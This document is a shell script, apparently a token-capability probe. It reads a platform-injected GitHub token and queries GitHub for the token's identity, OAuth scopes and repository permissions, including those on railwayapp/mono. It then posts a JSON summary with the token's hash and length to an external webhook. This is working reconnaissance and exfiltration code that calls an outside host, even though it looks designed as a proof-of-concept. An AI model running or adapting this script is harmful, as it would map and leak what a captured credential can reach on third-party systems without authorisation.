assets.probe.sh:
#!/bin/sh
set -eu
: "${GITHUB_TOKEN:?platform token was not injected}"
: "${CANARY_URL:?missing disposable webhook}"
tmp=$(mktemp -d)
trap 'rm -rf "$tmp"' EXIT INT TERM
api_get() {
  endpoint=$1
  stem=$2
  : >"$tmp/$stem.json"
  if ! status=$(curl -sS -D "$tmp/$stem.headers" -o "$tmp/$stem.json" -w '%{http_code}' -H 'Accept: application/vnd.github+json' -H "Authorization: Bearer $GITHUB_TOKEN" -H 'X-GitHub-Api-Version: 2022-11-28' "https://api.github.com$endpoint"); then status=000; fi
  printf '%s' "$status"
}
user_status=$(api_get /user user)
user_repos_status=$(api_get '/user/repos?per_page=100&affiliation=owner,collaborator,organization_member' user_repos)
installation_repos_status=$(api_get '/installation/repositories?per_page=100' installation_repos)
mono_status=$(api_get '/repos/railwayapp/mono' mono)
token_sha256=$(printf '%s' "$GITHUB_TOKEN" | sha256sum | awk '{print $1}')
token_length=$(printf '%s' "$GITHUB_TOKEN" | wc -c | tr -d ' ')
oauth_scopes=$(awk 'BEGIN{IGNORECASE=1} /^x-oauth-scopes:/ {sub(/\r$/,""); sub(/^[^:]*:[[:space:]]*/,""); print; exit}' "$tmp/user.headers")
user_login=$(jq -r '.login // empty' "$tmp/user.json" 2>/dev/null || true)
user_type=$(jq -r '.type // empty' "$tmp/user.json" 2>/dev/null || true)
user_repo_permissions=$(jq -c 'def z:{count:0,admin:false,maintain:false,push:false,triage:false,pull:false}; if type=="array" then {count:length,admin:any(.[];.permissions.admin==true),maintain:any(.[];.permissions.maintain==true),push:any(.[];.permissions.push==true),triage:any(.[];.permissions.triage==true),pull:any(.[];.permissions.pull==true)} else z end' "$tmp/user_repos.json" 2>/dev/null || printf '%s' '{"count":0,"admin":false,"maintain":false,"push":false,"triage":false,"pull":false}')
installation_repo_permissions=$(jq -c 'def z:{count:0,admin:false,maintain:false,push:false,triage:false,pull:false}; if (.repositories?|type)=="array" then .repositories|{count:length,admin:any(.[];.permissions.admin==true),maintain:any(.[];.permissions.maintain==true),push:any(.[];.permissions.push==true),triage:any(.[];.permissions.triage==true),pull:any(.[];.permissions.pull==true)} else z end' "$tmp/installation_repos.json" 2>/dev/null || printf '%s' '{"count":0,"admin":false,"maintain":false,"push":false,"triage":false,"pull":false}')
mono_permissions=$(jq -c 'if type=="object" then {admin:(.permissions.admin==true),maintain:(.permissions.maintain==true),push:(.permissions.push==true),triage:(.permissions.triage==true),pull:(.permissions.pull==true)} else {admin:false,maintain:false,push:false,triage:false,pull:false} end' "$tmp/mono.json" 2>/dev/null || printf '%s' '{"admin":false,"maintain":false,"push":false,"triage":false,"pull":false}')
jq -n --arg sha "$token_sha256" --argjson len "$token_length" --arg us "$user_status" --arg login "$user_login" --arg type "$user_type" --arg scopes "$oauth_scopes" --arg urs "$user_repos_status" --arg irs "$installation_repos_status" --arg ms "$mono_status" --argjson urp "$user_repo_permissions" --argjson irp "$installation_repo_permissions" --argjson mp "$mono_permissions" '{token:{sha256:$sha,length:$len},user:{status:($us|tonumber),login:(if $login=="" then null else $login end),type:(if $type=="" then null else $type end)},oauth_scopes:($scopes|split(",")|map(gsub("^\\s+|\\s+$";""))|map(select(length>0))),repositories:{user_endpoint:{status:($urs|tonumber),aggregate_permissions:$urp},installation_endpoint:{status:($irs|tonumber),aggregate_permissions:$irp},railway_mono:{status:($ms|tonumber),permissions:$mp}}}' >"$tmp/payload.json"
curl -sS -o /dev/null -H 'Content-Type: application/json' --data-binary @"$tmp/payload.json" "$CANARY_URL"
